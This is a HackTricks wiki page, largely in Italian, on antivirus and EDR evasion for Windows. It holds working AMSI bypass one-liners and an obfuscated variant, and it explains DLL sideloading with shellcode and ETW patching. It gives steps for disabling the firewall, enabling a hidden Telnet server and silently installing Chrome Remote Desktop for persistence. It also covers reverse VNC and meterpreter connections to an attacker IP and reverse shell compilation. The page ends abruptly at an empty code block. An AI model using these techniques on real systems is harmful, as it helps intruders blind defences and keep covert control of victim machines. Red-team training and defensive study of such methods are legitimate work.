# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Fermare Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uno strumento per fermare Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uno strumento per fermare Windows Defender facendo finta di un altro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologia di evasione AV**

Attualmente, gli AV utilizzano diversi metodi per verificare se un file è malevolo o meno: rilevamento statico, analisi dinamica e, per gli EDR più avanzati, analisi comportamentale.

### **Rilevamento statico**

Il rilevamento statico avviene segnalando stringhe note come malevoli o array di byte in un binario o script, e anche estraendo informazioni dal file stesso (es. file description, company name, digital signatures, icon, checksum, ecc.). Questo significa che usare tool pubblici noti può farti individuare più facilmente, poiché probabilmente sono stati analizzati e segnalati come malevoli. Ci sono alcuni modi per aggirare questo tipo di rilevamento:

- **Crittografia**

Se crittografi il binario, non ci sarà modo per l'AV di rilevare il tuo programma, ma avrai bisogno di un loader che decritti ed esegua il programma in memoria.

- **Offuscamento**

A volte tutto ciò che serve è cambiare alcune stringhe nel tuo binario o script per superare l'AV, ma questo può richiedere molto tempo a seconda di cosa vuoi offuscare.

- **Strumenti personalizzati**

Se sviluppi i tuoi strumenti, non esisteranno firme note come malevole, ma questo richiede molto tempo e sforzo.

> [!TIP]
> Un buon modo per verificare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente; in questo modo può dirti esattamente quali stringhe o byte del tuo binario vengono segnalati.

Consiglio vivamente di dare un'occhiata a questa [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sulla pratica AV Evasion.

### **Analisi dinamica**

L'analisi dinamica è quando l'AV esegue il tuo binario in una sandbox e osserva attività malevole (es. cercare di decrittare e leggere le password del browser, effettuare un minidump su LSASS, ecc.). Questa parte può essere un po' più difficile, ma ecco alcune cose che puoi fare per evadere le sandbox.

- **Sleep before execution** A seconda di come è implementato, può essere un ottimo metodo per bypassare l'analisi dinamica degli AV. Gli AV hanno molto poco tempo per scansionare i file per non interrompere il flusso dell'utente, quindi usare sleep lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare il sleep a seconda di come è implementato.
- **Checking machine's resources** Di solito le sandbox hanno pochissime risorse a disposizione (es. < 2GB RAM), altrimenti potrebbero rallentare la macchina dell'utente. Qui puoi essere creativo, ad esempio controllando la temperatura della CPU o le velocità delle ventole; non tutto sarà emulato nella sandbox.
- **Machine-specific checks** Se vuoi colpire un utente la cui workstation è joinata al dominio "contoso.local", puoi controllare il dominio del computer per vedere se corrisponde a quello specificato; in caso contrario, puoi far terminare il programma.

Si scopre che il computername della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione: se il nome corrisponde a HAL9TH, significa che sei dentro la sandbox di Defender e puoi terminare il programma.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Altri ottimi consigli di [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandbox

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Come detto prima in questo post, i **tool pubblici** verranno alla fine **rilevati**, quindi dovresti porti una domanda:

Ad esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? Oppure potresti usare un progetto diverso, meno noto e che dumpa comunque LSASS.

La risposta corretta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei progetti più rilevati dagli AV e dagli EDR; pur essendo un progetto fantastico, è un incubo aggirarlo per l'evasione AV, quindi cerca alternative per ciò che vuoi ottenere.

> [!TIP]
> Quando modifichi i tuoi payload per l'evasione, assicurati di **disabilitare l'invio automatico dei campioni** in Defender e, per favore, seriamente, **DO NOT UPLOAD TO VIRUSTOTAL** se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi verificare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.

## EXEs vs DLLs

Quando è possibile, dai sempre la priorità all'uso di DLL per l'evasione; per esperienza, i file DLL sono solitamente molto meno rilevati e analizzati, quindi è un trucco semplice per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di girare come DLL, ovviamente).

Come si vede in questa immagine, un DLL Payload da Havoc ha un tasso di rilevamento di 4/26 su antiscan.me, mentre il payload EXE ha un tasso di rilevamento 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Adesso mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto più stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL usato dal loader posizionando sia l'applicazione vittima che i payload malevoli uno accanto all'altro.

Puoi cercare programmi suscettibili a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e lo script powershell seguente:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Questo comando mostrerà l'elenco dei programmi suscettibili a DLL hijacking in "C:\Program Files\\" e i file DLL che cercano di caricare.

Consiglio vivamente di **esplorare personalmente i programmi DLL Hijackable/Sideloadable**, questa tecnica è abbastanza furtiva se eseguita correttamente, ma se usi programmi DLL Sideloadable noti pubblicamente, potresti essere facilmente scoperto.

Semplicemente inserire una DLL malevola con il nome che un programma si aspetta di caricare non farà eseguire il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema useremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.

**DLL Proxying** inoltra le chiamate che un programma effettua dalla DLL proxy (e malevola) alla DLL originale, preservando così la funzionalità del programma e permettendo di gestire l'esecuzione del tuo payload.

Userò il progetto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) di [@flangvik](https://twitter.com/Flangvik/)

Questi sono i passaggi che ho seguito:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
L'ultimo comando ci darà 2 file: un template del codice sorgente della DLL e la DLL originale rinominata.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Questi sono i risultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sia il nostro shellcode (codificato con [SGN](https://github.com/EgeBalci/sgn)) sia la proxy DLL hanno un tasso di rilevamento 0/26 su [antiscan.me](https://antiscan.me)! Lo considererei un successo.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Consiglio vivamente di guardare [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) su DLL Sideloading e anche [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) per approfondire quanto abbiamo discusso.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Puoi usare Freeze per caricare ed eseguire il tuo shellcode in modo furtivo.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L'evasione è solo un gioco del gatto e del topo: ciò che funziona oggi potrebbe essere rilevato domani, quindi non fare mai affidamento su un unico strumento; se possibile, prova a concatenare più tecniche di evasione.

## AMSI (Anti-Malware Scan Interface)

AMSI è stato creato per prevenire "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inizialmente, gli AV erano in grado di scansionare solo **file su disco**, quindi se riuscivi in qualche modo a eseguire payload **direttamente in memoria**, l'AV non poteva fare nulla per impedirlo, poiché non aveva sufficiente visibilità.

La funzionalità AMSI è integrata in questi componenti di Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Consente alle soluzioni antivirus di ispezionare il comportamento degli script esponendo i contenuti degli script in una forma sia non crittografata che non offuscata.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

Non abbiamo scritto alcun file su disco, ma siamo comunque stati intercettati in memoria a causa di AMSI.

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

Ci sono un paio di modi per aggirare AMSI:

- **Obfuscation**

Poiché AMSI lavora principalmente con rilevamenti statici, modificare gli script che provi a caricare può essere un buon metodo per evadere il rilevamento.

Tuttavia, AMSI ha la capacità di unobfuscating gli script anche se presentano più livelli, quindi obfuscation potrebbe essere una scelta poco efficace a seconda di come viene eseguita. Questo rende l'evasione non così semplice. Talvolta però basta cambiare un paio di nomi di variabili e funziona, quindi dipende da quanto qualcosa è stato segnalato.

- **AMSI Bypass**

Poiché AMSI è implementato caricando una DLL nel processo di powershell (anche cscript.exe, wscript.exe, ecc.), è possibile manometterlo facilmente anche eseguendo come utente non privilegiato. A causa di questa falla nell'implementazione di AMSI, i ricercatori hanno trovato diversi modi per evadere la scansione AMSI.

**Forcing an Error**

Forzare l'inizializzazione di AMSI affinché fallisca (amsiInitFailed) farà sì che non venga avviata alcuna scansione per il processo corrente. Questo è stato inizialmente divulgato da [Matt Graeber](https://twitter.com/mattifestation) e Microsoft ha sviluppato una signature per prevenirne un uso più ampio.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
È bastata una riga di codice powershell per rendere AMSI inutilizzabile nel processo powershell corrente. Questa riga è stata ovviamente segnalata dallo stesso AMSI, quindi è necessaria qualche modifica per poter usare questa tecnica.

Ecco un AMSI bypass modificato che ho preso da questo [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tieni presente che probabilmente questo verrà segnalato una volta pubblicato, quindi non dovresti pubblicare codice se il tuo piano è rimanere non rilevato.

**Memory Patching**

Questa tecnica è stata inizialmente scoperta da [@RastaMouse](https://twitter.com/_RastaMouse/) e consiste nel trovare l'indirizzo della funzione "AmsiScanBuffer" in amsi.dll (responsabile della scansione dell'input fornito dall'utente) e sovrascriverla con istruzioni che restituiscono il codice E_INVALIDARG; in questo modo il risultato della scansione effettiva restituirà 0, che viene interpretato come risultato pulito.

> [!TIP]
> Leggi [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) per una spiegazione più dettagliata.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

Questo strumento [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) genera anche script per bypassare AMSI.

**Rimuovere la signature rilevata**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**Prodotti AV/EDR che usano AMSI**

Puoi trovare una lista di prodotti AV/EDR che usano AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usa PowerShell versione 2**
Se usi PowerShell versione 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza che vengano scansionati da AMSI. Puoi farlo così:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging è una funzionalità che permette di registrare tutti i comandi PowerShell eseguiti su un sistema. Questo può essere utile per scopi di auditing e troubleshooting, ma può anche essere un **problema per gli attaccanti che vogliono eludere il rilevamento**.

Per bypassare PowerShell logging, puoi usare le seguenti tecniche:

- **Disable PowerShell Transcription and Module Logging**: Puoi usare uno strumento come [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) per questo scopo.
- **Use Powershell version 2**: Se usi PowerShell version 2, AMSI non verrà caricato, quindi puoi eseguire i tuoi script senza essere scansionato da AMSI. Puoi farlo: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Usa [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) per spawnare una powershell without defenses (this is what `powerpick` from Cobal Strike uses).


## Obfuscation

> [!TIP]
> Diverse tecniche di offuscamento si basano sulla cifratura dei dati, il che aumenterà l'entropia del binario rendendo più semplice per AVs e EDRs rilevarlo. Fai attenzione a questo e magari applica la cifratura solo a sezioni specifiche del tuo codice che sono sensibili o che devono essere nascoste.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Quando si analizza malware che usa ConfuserEx 2 (o fork commerciali) è comune imbattersi in diversi livelli di protezione che bloccano decompilatori e sandbox. Il workflow qui sotto **ripristina in modo affidabile un IL quasi originale** che può poi essere decompilato in C# con strumenti come dnSpy o ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`). Questo patcha anche il PE checksum quindi qualsiasi modifica farà crashare il binario. Usa **AntiTamperKiller** per localizzare le tabelle di metadata criptate, recuperare le XOR keys e riscrivere un assembly pulito:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
L'output contiene i 6 parametri anti-tamper (`key0-key3`, `nameHash`, `internKey`) che possono essere utili quando costruisci il tuo unpacker.

2.  Symbol / control-flow recovery – fornisci il file *clean* a **de4dot-cex** (un fork di de4dot consapevole di ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleziona il profilo ConfuserEx 2
• de4dot annullerà il control-flow flattening, ripristinerà namespace, classi e nomi di variabili originali e decritterà le stringhe costanti.

3.  Proxy-call stripping – ConfuserEx sostituisce le chiamate dirette ai metodi con wrapper leggeri (a.k.a *proxy calls*) per complicare ulteriormente la decompilazione. Rimuovili con **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Dopo questo passo dovresti osservare API .NET normali come `Convert.FromBase64String` o `AES.Create()` invece di funzioni wrapper opache (`Class8.smethod_10`, …).

4.  Manual clean-up – esegui il binario risultante sotto dnSpy, cerca grandi blob Base64 o l'uso di `RijndaelManaged`/`TripleDESCryptoServiceProvider` per localizzare il *payload* reale. Spesso il malware lo memorizza come un array di byte codificato TLV inizializzato dentro `<Module>.byte_0`.

La catena sopra ripristina il flusso di esecuzione **senza** necessità di far girare il sample maligno – utile quando si lavora su una postazione offline.

> 🛈  ConfuserEx produce un attributo custom chiamato `ConfusedByAttribute` che può essere usato come IOC per triage automatico dei sample.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lo scopo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM] in grado di aumentare la sicurezza del software tramite [code obfuscation] e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come usare il linguaggio `C++11/14` per generare, a tempo di compilazione, codice offuscato senza utilizzare strumenti esterni e senza modificare il compilatore.
- [**obfy**](https://github.com/fritzone/obfy): Aggiunge uno strato di operazioni offuscate generate dal framework di metaprogrammazione a template di C++, che renderà la vita di chi vuole crackare l'applicazione un po' più difficile.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore binario x64 in grado di offuscare vari file PE tra cui: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di metamorphic code per eseguibili arbitrari.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation fine-grained per linguaggi supportati da LLVM che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni regolari in catene ROP, ostacolando la nostra naturale concezione del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo della Zone.Identifier ADS per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **di fiducia** **non attiveranno SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Esempio d'uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando i payloads dentro file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che permette ad applicazioni e componenti di sistema di **registrare eventi**. Tuttavia, può anche essere usato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Simile a come AMSI viene disabilitato (bypassato), è anche possibile far sì che la funzione **`EtwEventWrite`** del processo in user space ritorni immediatamente senza registrare alcun evento. Questo si ottiene patchando la funzione in memoria per farla ritornare subito, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare più informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da tempo ed è ancora un ottimo modo per eseguire i tuoi strumenti post-exploitation senza essere rilevati da AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, ci si dovrà preoccupare soltanto di patchare AMSI per l'intero processo.

La maggior parte dei C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) fornisce già la capacità di eseguire C# assemblies direttamente in memoria, ma ci sono diversi modi per farlo:

- **Fork\&Run**

Coinvolge **l'avvio di un nuovo processo sacrificabile**, iniettare il tuo codice malevolo post-exploitation in quel nuovo processo, eseguire il codice malevolo e, al termine, terminare il nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo Beacon implant. Ciò significa che se qualcosa nella nostra azione post-exploitation va storto o viene scoperto, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva.** Lo svantaggio è che si ha una **maggior probabilità** di essere scoperti dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Si tratta di iniettare il codice malevolo post-exploitation **nel proprio processo**. In questo modo si evita di creare un nuovo processo che potrebbe essere scansionato dall'AV, ma lo svantaggio è che se qualcosa va storto durante l'esecuzione del tuo payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon** poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi approfondire il caricamento di C# Assembly, dai un'occhiata a questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e al loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**, guarda [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'interpreter environment installed on the Attacker Controlled SMB share**.

Consentendo l'accesso agli Interpreter Binaries e all'ambiente sulla SMB share puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica: Defender scansiona ancora gli script ma sfruttando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le firme statiche**. I test con script di reverse shell casuali non offuscati in questi linguaggi si sono rivelati efficaci.

## TokenStomping

Token stomping è una tecnica che permette a un attacker di **manipolare l'access token o un security product come un EDR o AV**, consentendo di ridurne i privilegi in modo che il processo non termini ma non abbia i permessi per controllare attività malevole.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è semplice distribuire Chrome Remote Desktop su un PC vittima e poi usarlo per prenderne il controllo e mantenere la persistence:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricarlo.
2. Esegui l'installer silenziosamente sulla vittima (richiesti privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca su next. Il wizard chiederà di autorizzare; clicca il pulsante Authorize per continuare.
4. Esegui il parametro fornito con alcuni aggiustamenti: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).


## Advanced Evasion

L'evasion è un argomento molto complesso; a volte bisogna considerare molte diverse fonti di telemetry in un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti confronterai avrà i suoi punti di forza e di debolezza.

Ti incoraggio vivamente a guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per avere un'introduzione a tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) su Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del file binario** finché **non scopre quale parte Defender** considera malevola e te la mostra.\
Un altro tool che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web pubblico disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) facendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (vuoi i bin downloads, non il setup)

**ON THE HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Quindi, sposta il binario _**winvnc.exe**_ e il file **appena** creato _**UltraVNC.ini**_ nella **victim**

#### **Reverse connection**

L'attacker dovrebbe eseguire sul suo host il binario `vncviewer.exe -listen 5900` in modo da essere pronto a ricevere una reverse VNC connection. Poi, sulla **victim**: Avvia il daemon `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere lo stealth non devi fare le seguenti cose

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). Controlla se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o farà aprire [the config window](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` e **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilare il nostro reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
